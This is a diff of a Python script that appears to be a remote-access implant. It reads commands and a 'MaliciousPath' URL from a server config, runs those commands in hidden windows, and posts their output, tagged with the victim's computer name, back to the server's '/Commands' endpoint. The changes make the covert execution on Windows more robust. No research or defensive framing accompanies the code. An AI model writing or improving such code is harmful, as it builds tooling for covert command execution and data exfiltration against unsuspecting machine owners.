@@ -36,22 +36,47 @@ def conf():
     COMMANDSTOEXE = conf['Commands']
     MALICIOUSURL = SERVERADDRESS+conf['MaliciousPath']
 
-def RunCommand(command):
-    #run = os.popen(command)
-    #results = run.read()
-    #run.close()
-    #return results
+#def RunCommand(command):
+#    run = os.popen(command)
+#    results = run.read()
+#    run.close()
+#    return results
 
-    run = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE)
-    cmd_out, cmd_err = run.communicate()
-    return (cmd_out.decode("utf-8"))
+    #run = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE)
+    #cmd_out, cmd_err = run.communicate()
+    #return (cmd_out.decode("utf-8"))
+
+def subprocess_args(include_stdout=True):
+    # The following is true only on Windows.
+    if hasattr(subprocess, 'STARTUPINFO'):
+        si = subprocess.STARTUPINFO()
+        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        # Windows doesn't search the path by default. Pass it an environment so
+        # it will.
+        env = os.environ
+    else:
+        si = None
+        env = None
+    if include_stdout:
+        ret = {'stdout': subprocess.PIPE}
+    else:
+        ret = {}
+
+    ret.update({'stdin': subprocess.PIPE,
+                'stderr': subprocess.PIPE,
+                'startupinfo': si,
+                'env': env })
+    return ret
+
 
 def launchWithoutConsole(command, args):
-    """Launches 'command' windowless and waits until finished"""
-    startupinfo = subprocess.STARTUPINFO()
-    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-    cmd_out, cmd_err = subprocess.Popen([command] + args, startupinfo=startupinfo, stdout=subprocess.PIPE).communicate()
-    return cmd_out.decode("utf-8")
+   """Launches 'command' windowless"""
+   startupinfo = subprocess.STARTUPINFO()
+   startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+   run = subprocess.Popen([command] + args, startupinfo=startupinfo,stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
+   cmd_out, cmd_err = run.communicate()
+   return (cmd_out.decode("utf-8"))
 
 def PreperToSend(type,str):
     j = json.dumps({'computer':os.environ['COMPUTERNAME'],'type':type,'data':str})
@@ -61,7 +86,7 @@ def Activate():
     HttpPostRequest('/Commands',PreperToSend("Activated",str(datetime.datetime.now())+'\r\n'))
     if COMMANDSTOEXE is not None:
         for command in COMMANDSTOEXE:
-            HttpPostRequest('/Commands',PreperToSend(str(command),launchWithoutConsole(str(command),[])))
+            HttpPostRequest('/Commands',PreperToSend(str(command),subprocess.check_output([str(command)],**subprocess_args(False)).decode("utf-8")))
 
 
 def DownloadFile(url):
